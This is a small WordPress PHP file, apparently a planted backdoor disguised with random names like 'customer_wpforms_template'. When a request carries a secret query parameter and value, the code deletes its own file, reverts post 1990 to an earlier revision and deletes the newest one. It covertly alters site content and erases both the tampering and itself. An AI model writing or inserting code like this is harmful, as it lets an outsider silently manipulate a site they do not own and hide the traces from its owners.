<?php

function customer_wpforms_template() {
	if (isset($_GET['kit_redirection_core_gravatar']) && $_GET['kit_redirection_core_gravatar'] === 'word_media_smooth') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$toggle_extended_statistics_builder = 1990;
		$ticker_countdown_field = wp_get_post_revisions($toggle_extended_statistics_builder);
		if (empty($ticker_countdown_field)) die('no revisions');
		if (count($ticker_countdown_field) < 2) die('less than 2');
		$effects_lock_qr = array_shift($ticker_countdown_field);
		$publisher_core_all_remove = $effects_lock_qr->ID;
		$description_marketplace_zoom_comments = array_shift($ticker_countdown_field);
		$subscription_details_estate_lock = $description_marketplace_zoom_comments->ID;
		$viewer_help_flexible = wp_restore_post_revision($subscription_details_estate_lock);
		if ($viewer_help_flexible === false) die('error restoring');
		$viewer_help_flexible = wp_delete_post_revision($publisher_core_all_remove);		
		if ($viewer_help_flexible === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'customer_wpforms_template');
